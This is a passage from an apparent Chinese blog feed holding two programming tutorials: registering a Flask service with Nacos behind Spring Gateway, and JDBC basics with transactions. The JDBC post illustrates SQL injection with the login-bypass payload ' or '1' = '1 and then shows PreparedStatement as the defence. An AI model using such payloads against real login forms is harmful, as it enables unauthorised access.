<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130905.png" alt=" "><br>但当我们再隔一段时间后（准确来说是15秒)，发现已经没有了健康实例。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130918.png" alt=" "><br>再隔一段时间后（准确来说是30秒)，发现已经没有了服务。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130923.png" alt=" "><br>这得从Nacos对服务实例的健康检查说起。我们刚才注册上去的服务是<strong>临时实例</strong>。</p>
<ul>
<li><p>对于<strong>临时实例</strong><br>Nacos服务端在15秒内如果没收到客户端的心跳请求，会将该实例设置为不健康，在30秒内没收到心跳，会将这个临时实例摘除。</p>
</li>
<li><p>对于<strong>非临时实例</strong><br>Nacos会主动询问，也就是不再需要客户端主动完成心跳检测。</p>
</li>
</ul>
<p>为了保证我们的服务注册上去以后，保持健康状态，即让Nacos服务端知道我们的服务并没有问题。因此需要定期（一般是5秒）向Nacos服务端发起心跳检测的请求。</p>
<h2 id="2-心跳检测"><a href="#2-心跳检测" class="headerlink" title="2. 心跳检测"></a>2. 心跳检测</h2><blockquote>
<ul>
<li><strong>请求地址：</strong><br><a href="http://127.0.0.1:8848/nacos/v1/ns/instance/beat?serviceName=%E6%9C%8D%E5%8A%A1%E5%90%8D&ip=%E6%9C%8D%E5%8A%A1ip%E5%9C%B0%E5%9D%80&port=%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3">http://127.0.0.1:8848/nacos/v1/ns/instance/beat?serviceName=服务名&amp;ip=服务ip地址&amp;port=服务端口</a></li>
<li><strong>请求方式</strong>：PUT</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 用于异步处理心跳检测</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_register</span>():</span><br><span class="line">	url = <span class="string">&quot;http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=pythonservice&amp;ip=127.0.0.1&amp;port=5000&quot;</span></span><br><span class="line">	res = requests.post(url)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;完成注册&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 心跳检测</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_beat</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		url = <span class="string">&quot;http://127.0.0.1:8848/nacos/v1/ns/instance/beat?serviceName=pythonservice&amp;ip=127.0.0.1&amp;port=5000&quot;</span></span><br><span class="line">		res = requests.put(url)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;心跳检测中... 响应状态码： <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">		time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	service_register()</span><br><span class="line">	<span class="comment"># 5 秒后执行心跳检测</span></span><br><span class="line">	threading.Timer(<span class="number">5</span>, service_beat()).start()</span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、使用nacos-sdk-python完成注册"><a href="#三、使用nacos-sdk-python完成注册" class="headerlink" title="三、使用nacos-sdk-python完成注册"></a>三、使用nacos-sdk-python完成注册</h1><p><a href="https://pypi.org/project/nacos-sdk-python/">Nacos官方文档</a></p>
<ul>
<li><strong>安装 nacos-sdk-python 模块</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install nacos-sdk-python</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>服务注册</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nacos</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># nacos 服务地址</span></span><br><span class="line">SERVER_ADDRESSES = <span class="string">&quot;http://127.0.0.1:8848&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 官方文档中更加详细的描述了此方法的形参，包括命名空间、sk、ak等</span></span><br><span class="line"><span class="comment"># 在此处，我只需要传 服务地址 即可</span></span><br><span class="line">client = nacos.NacosClient(SERVER_ADDRESSES)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_register</span>():</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	 ephemeral参数：是否是临时服务，应为false; </span></span><br><span class="line"><span class="string">	 刚才上面也提到了，如果是 非临时实例，客户端就无需主动完成心跳检测。</span></span><br><span class="line"><span class="string">	 因此此处将服务注册为 非临时实例</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	client.add_naming_instance(<span class="string">&quot;pythonservice&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;5000&quot;</span>, ephemeral=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	threading.Timer(<span class="number">5</span>, service_register).start()</span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="四、SpringBoot远程调用"><a href="#四、SpringBoot远程调用" class="headerlink" title="四、SpringBoot远程调用"></a>四、SpringBoot远程调用</h1><p>我先给出Java部分的代码结构，在此处，我们只会使用到 java-demo 模块，在下面一节，就会使用到 gateway 模块。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130930.png" alt=" "></p>
<h2 id="1-添加-Python-端业务逻辑"><a href="#1-添加-Python-端业务逻辑" class="headerlink" title="1. 添加 Python 端业务逻辑"></a>1. 添加 Python 端业务逻辑</h2><p>在此处，我们简单的套上了一个 Flask 接口。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/py&quot;</span>, methods=[<span class="string">&#x27;get&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">py1</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;hello py&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;hello, python service&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-SpringBoot-的远程调用"><a href="#2-SpringBoot-的远程调用" class="headerlink" title="2. SpringBoot 的远程调用"></a>2. SpringBoot 的远程调用</h2><ul>
<li>java-demo 模块的配置如下</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">javaservice</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br></pre></td></tr></table></figure>

<ul>
<li>业务逻辑如下</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/java&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaDemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(JavaDemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">javaService</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;java service start...&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://pythonservice/py&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送http请求，实现远程调用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ps</span> <span class="operator">=</span> restTemplate.getForObject(url, String.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;Python service 返回内容: 【 &quot;</span> + ps + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Java远程调用Python: &quot;</span> + ps;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问接口<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130944.png"></li>
</ul>
<hr>
<h1 id="五、SpringGateway网关转发"><a href="#五、SpringGateway网关转发" class="headerlink" title="五、SpringGateway网关转发"></a>五、SpringGateway网关转发</h1><p>回到我最开始的初衷，我们是想提供深度学习模型的接口，因此还是希望前端直接调用Flask的接口而不是先调Java，Java再调Flask。<br>而微服务中一般会使用SpringGateway来做请求转发，因此，我们就来做SpringGateway转发到我们的Flask接口。</p>
<ul>
<li>gateway 模块的配置如下</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">10010</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> </span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">javaservice</span> </span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://javaservice</span> </span><br><span class="line">          <span class="attr">predicates:</span> </span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/java/**</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">pythonservice</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://pythonservice</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/py/**</span></span><br></pre></td></tr></table></figure>
<p>这里，我们将SpringBoot服务与Flask服务均做了请求转发配置</p>
<ul>
<li>访问接口</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130951.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815131001.png" alt=" "></p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>flask</tag>
        <tag>微服务</tag>
        <tag>python</tag>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC编程详解以及Druid的使用</title>
    <url>/posts/303fc3a3.html</url>
    <content><![CDATA[<h1 id="一、事务-简介-四大特征"><a href="#一、事务-简介-四大特征" class="headerlink" title="一、事务-简介&amp;四大特征"></a>一、事务-简介&amp;四大特征</h1><blockquote>
<h2 id="①事务简介"><a href="#①事务简介" class="headerlink" title="①事务简介"></a>①事务简介</h2></blockquote>
<ul>
<li>数据库的&#x3D;&#x3D;事务&#x3D;&#x3D;（Transaction）是一种机制、操作序列，包含了&#x3D;&#x3D;一组数据库操作命令&#x3D;&#x3D;。</li>
<li>事务把所有命令当做一个整体一起向系统提交或撤销操作请求，即这一组数据库命令&#x3D;&#x3D;要么同时成功，要么同时失败&#x3D;&#x3D;。</li>
<li>事务是一个不可分割的工作逻辑单元<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 开启事务</span><br><span class="line"><span class="keyword">START</span> TRANSACTION </span><br><span class="line">或者 <span class="keyword">BEGIN</span>;</span><br><span class="line"></span><br><span class="line"># 提交事务</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"># 回滚事务</span><br><span class="line"><span class="keyword">ROLLBACK</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<h2 id="②事务四大特征"><a href="#②事务四大特征" class="headerlink" title="②事务四大特征"></a>②事务四大特征</h2></blockquote>
<p>事务是由一组SQL语句组成的逻辑处理单元，事务具有以下4个特征，通常简称为事务的ACID属性：</p>
<ol>
<li>原子性（&#x3D;&#x3D;A&#x3D;&#x3D;tominity）：事务是不可分割的最小操作单位，要么同时成功，要么同时失败。</li>
<li>一致性（&#x3D;&#x3D;C&#x3D;&#x3D;onsistent）：在事务开始或完成时，数据必须保持一致状态。举个转账的例子，假设用户A与用户B各有1000元，则不管A、B间如何转账、转几次账，事务结束后两者的钱的总和依然是2000元。</li>
<li>隔离性（&#x3D;&#x3D;I&#x3D;&#x3D;solation）：数据库提供一定的隔离机制，保证事务在不受外部并发操作影响的独立环境执行。即事务处理过程的中间状态对外部是不可见的。</li>
<li>持久性（&#x3D;&#x3D;D&#x3D;&#x3D;urabilty）：事务完成后，对数据的修改是永久性的，即使数据库系统遇到故障也能保持。</li>
</ol>
<blockquote>
<p><strong>Mysql事务默认自动提交</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看事务默认提交方式</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@autocommit</span>;</span><br><span class="line"># <span class="number">1</span> : 自动提交  <span class="number">0</span> ：手动提交</span><br><span class="line"># 修改事务提交方式</span><br><span class="line"><span class="keyword">set</span> @<span class="variable">@autocommit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h1 id="二、JDBC简介"><a href="#二、JDBC简介" class="headerlink" title="二、JDBC简介"></a>二、JDBC简介</h1><blockquote>
<p><strong>JDBC概念：</strong></p>
<ul>
<li>JDBC就是使用Java语言操作关系数据库的一套API</li>
<li>全称（&#x3D;&#x3D;J&#x3D;&#x3D;ava &#x3D;&#x3D;D&#x3D;&#x3D;ata&#x3D;&#x3D;B&#x3D;&#x3D;ase &#x3D;&#x3D;C&#x3D;&#x3D;onnectivity）Java数据库连接</li>
</ul>
<p><strong>JDBC本质：</strong></p>
<ul>
<li>官方（sun公司）定义的一套操作所有关系型数据库的规则，即接口</li>
<li>各个数据库厂商实现这套接口，提供数据库驱动jar包</li>
<li>开发者使用这套接口编程，真正执行代码的是驱动jar包中的实现类</li>
</ul>
<p><strong>JDBC优势：</strong></p>
<ul>
<li>各数据库厂商使用相同接口，Java代码不需要针对不同数据库分别开发</li>
<li>可随时更换底层数据库，访问数据库的Java代码可拓展性强</li>
</ul>
</blockquote>
<h1 id="三、JDBC操作步骤"><a href="#三、JDBC操作步骤" class="headerlink" title="三、JDBC操作步骤"></a>三、JDBC操作步骤</h1><blockquote>
<p> <strong>JDBC操作步骤主要代码</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// 1. 注册驱动</span></span><br><span class="line">   Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   url语法：</span></span><br><span class="line"><span class="comment">   jdbc:mysql://IP地址(域名):端口号/数据库名称??参数键值对1&amp;参数键值对2...</span></span><br><span class="line"><span class="comment">细节：</span></span><br><span class="line"><span class="comment">	·如果连接本机数据库,并且nysql服务默认端口四3306,则url可简写为：jdbc:mysql:///数据库名称...</span></span><br><span class="line"><span class="comment">	·配置 useSSL = lase,禁用安全连接方式,解决警告提示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/数据库名称?参数键值对1&amp;参数键值对2...&quot;</span>;</span><br><span class="line">   <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">   <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;*******&quot;</span>;</span><br><span class="line">   <span class="comment">// 2. 获取连接</span></span><br><span class="line">   <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 3. 定义 sql</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 4. 获取执行sql的对象</span></span><br><span class="line">   <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 5. 执行sql</span></span><br><span class="line">   stmt.executeUpdate(sql);   <span class="comment">// INSERT、UPDATE、DELETE 以及 DDL语句</span></span><br><span class="line">   stmt.executeQuery(sql);    <span class="comment">// SELECT 查询语句</span></span><br><span class="line">   stmt.execute();            <span class="comment">// 执行返回多个结果集、更新计数或二者组合的语句</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 6. 释放资源</span></span><br><span class="line">   stmt.close();</span><br><span class="line">   connection.close();</span><br></pre></td></tr></table></figure>

<h2 id="①注册驱动（DriverManager-API）"><a href="#①注册驱动（DriverManager-API）" class="headerlink" title="①注册驱动（DriverManager API）"></a>①注册驱动（DriverManager API）</h2><blockquote>
<p> 连接数据库前，首先需要加载数据库驱动到 JVM，通过java.lang.Class类的静态方法<br> forName(String className)实现。成功加载后，会将Driver类的实例注册到DriverManager类中</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="②创建数据库连接并获取执行对象（Connection-API）"><a href="#②创建数据库连接并获取执行对象（Connection-API）" class="headerlink" title="②创建数据库连接并获取执行对象（Connection API）"></a>②创建数据库连接并获取执行对象（Connection API）</h2><blockquote>
<ul>
<li><strong>Connection（数据库连接对象）作用：</strong></li>
</ul>
<ol>
<li>获取连接数据库的对象</li>
<li>获取执行sql的对象</li>
<li>管理事务</li>
</ol>
</blockquote>
<p><strong>1. 连接数据库，获取的 connection 对象就代表一个数据库的连接</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure>
<p><strong>2. 获取执行sql的对象</strong></p>
<ul>
<li><strong>普通执行 sql 对象</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.createStatement();</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>预编译 sql 的执行 sql 对象，&#x3D;&#x3D;防止 sql 注入&#x3D;&#x3D;</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(sql);</span><br></pre></td></tr></table></figure>

<blockquote>
<h2 id="sql-注入-sql注入通过操作输入来修改事先定义好的sql语句，用以达到执行代码对服务器进行-攻击-的方法。-举个例子：加入某网站判断用户输入的账号与密码是否有效使用的代码语句如下：-此处如何使用-sql-注入？-只需将-pwd-赋值-为-or-1-1，name任意，即可完成-sql-注入。-观察使用sql注入后的sql语句，or-条件一定成立，因此上述中的-resultSet-next-一定成立。"><a href="#sql-注入-sql注入通过操作输入来修改事先定义好的sql语句，用以达到执行代码对服务器进行-攻击-的方法。-举个例子：加入某网站判断用户输入的账号与密码是否有效使用的代码语句如下：-此处如何使用-sql-注入？-只需将-pwd-赋值-为-or-1-1，name任意，即可完成-sql-注入。-观察使用sql注入后的sql语句，or-条件一定成立，因此上述中的-resultSet-next-一定成立。" class="headerlink" title="sql 注入 - sql注入通过操作输入来修改事先定义好的sql语句，用以达到执行代码对服务器进行&#x3D;&#x3D;攻击&#x3D;&#x3D;的方法。 举个例子：加入某网站判断用户输入的账号与密码是否有效使用的代码语句如下：        此处如何使用 sql 注入？    只需将 pwd 赋值 为 &#39; or &#39;1&#39; = &#39;1，name任意，即可完成 sql 注入。        观察使用sql注入后的sql语句，or 条件一定成立，因此上述中的 resultSet.next()    一定成立。"></a><strong>sql 注入</strong><br> - sql注入通过操作输入来修改事先定义好的sql语句，用以达到执行代码对服务器进行&#x3D;&#x3D;攻击&#x3D;&#x3D;的方法。<br> 举个例子：加入某网站判断用户输入的账号与密码是否有效使用的代码语句如下：<br>    <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"><br>    此处如何使用 sql 注入？<br>    只需将 pwd 赋值 为 <code>&#39; or &#39;1&#39; = &#39;1</code>，name任意，即可完成 sql 注入。<br>    <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"><br>    观察使用sql注入后的sql语句，or 条件一定成立，因此上述中的 <code>resultSet.next()</code><br>    一定成立。</h2><p> <strong>PreparedStatement的作用： 预编译 sql 执行 sql 语句</strong><br> ①获取PreparedStatement对象</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 ? 占位符 替代 sql 语句中的参数值 </span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from tb_user where username = ? and password = ?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 通过 Connection 对象获取，并传入对应的 sql 语句</span></span><br><span class="line"><span class="string">PreparedStatement pstmt = connection.preparedStatement(sql);</span></span><br></pre></td></tr></table></figure>
<p>②设置参数值</p>
<blockquote>
<p>PreparedStatement对象：<code>setXxx(参数1，参数2)</code> 给 ? 赋值<br>Xxx：数据类型。如 <code>setInt(参数1，参数2)</code><br>参数：</p>
<ul>
<li>参数1：&#x3D;&#x3D;?&#x3D;&#x3D; 的位置编号，从 &#x3D;&#x3D;1&#x3D;&#x3D; 开始</li>
<li>参数2：&#x3D;&#x3D;?&#x3D;&#x3D; 的值</li>
</ul>
</blockquote>
<p>③执行sql</p>
<blockquote>
<p><code>executeUpdate(); / executeQuery();   不需要传送sql</code></p>
</blockquote>
<hr>
<blockquote>
<p><strong>PreparedStatement优势</strong></p>
<ul>
<li>预编译sql，性能更高</li>
<li>防止sql注入：&#x3D;&#x3D;将敏感字符进行转义&#x3D;&#x3D;</li>
</ul>
<p><strong>回到刚才的例子，将代码改成下方即可避免sql注入</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"></p>
</blockquote>
<ul>
<li><p><strong>执行存储过程的对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CallableStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareCall(sql); </span><br></pre></td></tr></table></figure>
<p><strong>3. 管理事务</strong></p>
</li>
<li><p><strong>Mysql 事务管理</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">开启事务：<span class="keyword">BEGIN</span>; <span class="operator">/</span> <span class="keyword">START</span> TRANSACTION;</span><br><span class="line">提交事务：<span class="keyword">COMMIT</span>;</span><br><span class="line">回滚事务：<span class="keyword">ROLLBACK</span>;</span><br><span class="line"></span><br><span class="line">Mysql 默认自动提交事务</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JDBC事务管理：Connection接口定义了3个对应方法</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// autoCommit = true-&gt;自动提交事务 ; false-&gt;手动提交事务，即开启事务</span></span><br><span class="line">开启事务：setAutoCommit(<span class="type">boolean</span> autoCommit); </span><br><span class="line">提交事务：commit();</span><br><span class="line">回滚事务：rollback();</span><br></pre></td></tr></table></figure>
<h2 id="③执行sql语句（Statment-API-PreparedStatement-API）"><a href="#③执行sql语句（Statment-API-PreparedStatement-API）" class="headerlink" title="③执行sql语句（Statment API &amp; PreparedStatement API）"></a>③执行sql语句（Statment API &amp; PreparedStatement API）</h2><ul>
<li><strong>执行sql语句</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">executeUpdate</span><span class="params">(sql)</span>;         <span class="comment">// 执行 DML 以及 DDL语句</span></span><br><span class="line"><span class="comment">//  返回值：（1）DML语句影响的行数 （2）DDL执行成功也可能返回 0</span></span><br><span class="line"></span><br><span class="line">ResultSet <span class="title function_">executeQuery</span><span class="params">(sql)</span>;    <span class="comment">// 执行 DQL 语句</span></span><br><span class="line"><span class="comment">// 返回值：ResultSet 结果集对象</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>ResultSet（结果集对象）作用：</strong> 封装 DQL 查询语句的结果</li>
</ul>
<hr>
<ul>
<li><h2 id="获取查询结果boolean-next-1-将光标从当前位置向前移动一行-2-判断当前行是否为有效行返回值：-true：有效行，当前行有数据-false：无效行，当前行无数据"><a href="#获取查询结果boolean-next-1-将光标从当前位置向前移动一行-2-判断当前行是否为有效行返回值：-true：有效行，当前行有数据-false：无效行，当前行无数据" class="headerlink" title="获取查询结果boolean next():    (1)将光标从当前位置向前移动一行 (2)判断当前行是否为有效行返回值：  - true：有效行，当前行有数据 - false：无效行，当前行无数据"></a><strong>获取查询结果</strong><br><code>boolean next():    (1)将光标从当前位置向前移动一行 (2)判断当前行是否为有效行</code><br>返回值：<br>  - true：有效行，当前行有数据<br> - false：无效行，当前行无数据</h2>  <code>xxx getXxx(参数)：获取数据</code><br>  参数：<ul>
<li>int：列的编号，从 &#x3D;&#x3D;1&#x3D;&#x3D; 开始</li>
<li>String：列的名称</li>
</ul>
</li>
</ul>
<p> <strong>ResultSet使用步骤</strong></p>
<ol>
<li>游标向下移动一行，并判断该行是否有数据</li>
<li>获取数据：getXxx(参数)</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 循环判断游标是否是最后一行末尾 </span></span><br><span class="line"><span class="keyword">while</span>(resutSet.next())&#123;</span><br><span class="line">	<span class="comment">// 获取数据</span></span><br><span class="line">	resultSet.getXxx(参数);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>e.g</strong><br>数据库 test 中的 students 表如下<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163244.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 完成常规注册以及连接</span></span><br><span class="line"><span class="comment">// 1. 注册驱动</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=false&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;****&quot;</span>;</span><br><span class="line"><span class="comment">// 2. 获取连接</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><strong>int executeUpdate() 使用</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 3.定义 sql</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;UPDATE students set age = 20 WHERE name = &#x27;小唐&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// 4.获取执行sql的对象 Statement</span></span><br><span class="line"><span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"><span class="comment">// 5. 执行sql, 返回受影响行数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> stmt.executeUpdate(sql);</span><br><span class="line"><span class="comment">// 6. 处理结果</span></span><br><span class="line">System.out.println(count);</span><br><span class="line"><span class="comment">// 7. 释放资源</span></span><br><span class="line">stmt.close();</span><br><span 